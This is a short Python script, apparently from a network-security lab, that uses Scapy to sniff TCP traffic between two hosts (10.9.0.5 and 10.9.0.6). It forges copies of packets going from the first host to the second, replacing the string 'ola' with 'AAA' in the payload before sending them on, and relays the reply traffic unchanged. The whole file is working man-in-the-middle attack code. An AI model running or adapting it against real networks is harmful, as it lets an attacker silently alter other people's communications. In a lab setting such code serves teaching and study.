#!/usr/bin/env python3
from scapy.all import *

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].payload)
        del(newpkt[TCP].chksum)

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load
            # استبدال ola بـ AAA
            newdata = data.replace(b'ola', b'AAA').replace(b'Ola', b'AAA').replace(b'OLA', b'AAA')
            send(newpkt/newdata, verbose=False)
        else:
            send(newpkt, verbose=False)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        newpkt = IP(bytes(pkt[IP]))
        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        send(newpkt, verbose=False)

f = f'tcp and (host {IP_A} and host {IP_B})'
sniff(iface='eth0', filter=f, prn=spoof_pkt)
